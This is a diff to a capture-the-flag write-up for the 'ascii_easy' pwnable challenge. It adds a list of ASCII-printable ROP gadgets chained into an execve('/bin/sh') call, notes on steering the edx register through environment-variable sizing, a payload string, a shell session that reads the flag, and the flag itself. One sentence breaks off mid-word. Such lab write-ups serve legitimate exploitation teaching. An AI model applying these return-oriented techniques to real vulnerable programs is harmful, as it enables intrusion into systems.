@@ -71,18 +71,56 @@ int is_ascii(int c){
 
 So we need to find ascii printable gadgets.
 
-
-
-EXECV address is: `0x5555e000`
-
-
-```
-Breakpoint 1, 0x08048532 in vuln ()
-(gdb) x/1s $edx                                                                                                                                                                                             
-0xffe33bb0:     "@gaU/bin/sh"
 ```
 ROPgadget --binary ./libc-2.15.so --offset 0x5555e000 --badbytes "00-1f|80-ff > gadgets.txt
+```
+
+### Useful gadgets
+
+``` 
+# move edx to ebx 
+0x55606476 : mov ebx, edx ; cmp eax, 0xfffff001 ; jae 0xa8480 ; ret
+
+# Use the inc edx again until reaching a 0 word value on the stack
+0x55642d7a : inc edx ; xor eax, eax ; ret
+
+# store 0 in ECX
+0x555f616f : mov ecx, dword ptr [edx] ; test ecx, ecx ; jne 0x98168 ; pop esi ; pop edi ; pop ebp ; ret 
+
+# Add 12 bytes of garbage to cancel the pops effect
+
+# store 0 in edx
+0x55617940 : mov edx, 0xffffffff ; cmovne eax, edx ; ret
+0x55642d7a : inc edx ; xor eax, eax ; ret
+
+# 11 times (for sys_execve)
+0x556c6864 : inc eax ; ret 0
+
+# call int 80h to execute sys 
+0x55667176 : inc esi ; int 0x80
+```
+
+### Debugging foundings
+While playing around with my payload I've found out that the edx register can
+point to the last part of our argv parameter if we set the env parameters just right.
+so I've set an env variable with a specific size which makes edx point to
+/bin/sh (last part of our argv string).
 
 ```
+ascii_easy@pwnable:/tmp/organic$ python payload.py 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAvd\`Uz-dUz-dUz-dUz-dUz-dUz-dUz-dUz-dUz-dUz-dUz-dUz-dUz-dUz-dUz-dUz-dUz-dUz-dUz-dUz-dUoa_UAAAAAAAAAAAA@yaUz-dUdhlUdhlUdhlUdhlUdhlUdhlUdhlUdhlUdhlUdhlUdhlUvqfU/bin/sh
+triggering bug...
+$ ls
+payload.py
+$ cd /home/ascii_easy
+$ /bin/cat /home/ascii_easy/flag
+damn you ascii armor... what a pain in the ass!! :(
+$  
+```
+
+When debugging with GDB, I've found that the value of edx depends on the remot
+
+flag: `damn you ascii armor... what a pain in the ass!! :(`
+
 
 
